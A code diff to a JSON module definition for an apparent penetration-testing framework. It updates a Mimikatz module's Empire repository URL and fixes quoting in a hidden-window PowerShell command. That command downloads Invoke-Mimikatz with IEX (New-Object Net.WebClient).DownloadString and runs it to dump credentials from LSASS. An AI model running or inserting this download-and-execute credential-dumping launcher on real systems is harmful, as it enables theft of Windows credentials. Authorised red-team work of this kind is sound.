@@ -10,7 +10,7 @@
     "lang": "PowerShell",
     "privilege": true,
     "notes": "Invoke-Mimikatz.ps1 is currently part of the Empire project https://github.com/BC-SECURITY/Empire and was originally part of the PowerSploit project https://github.com/PowerShellMafia/PowerSploit",
-    "remote": "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1",
+    "remote": "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1",
     "local": ["data", "src", "PowerSploit", "Exfiltration", "Invoke-Mimikatz.ps1"],
     "options": [
       {"name": "DumpCreds", "value": "true", "required": false, "flag": "-DumpCreds", "description":"[Switch]Use mimikatz to dump credentials out of LSASS."},
@@ -24,13 +24,12 @@
       "-nop",
       "-WindowStyle",
       "0",
-      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');",
+      "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1');",
       "Invoke-Mimikatz",
       "{{DumpCreds.Flag}}",
       "{{DumpCerts.Flag}}",
       "{{Command}}",
-      "{{ComputerName}}",
-      "\""
+      "{{ComputerName}}"
     ]
   },
   "powershell": {
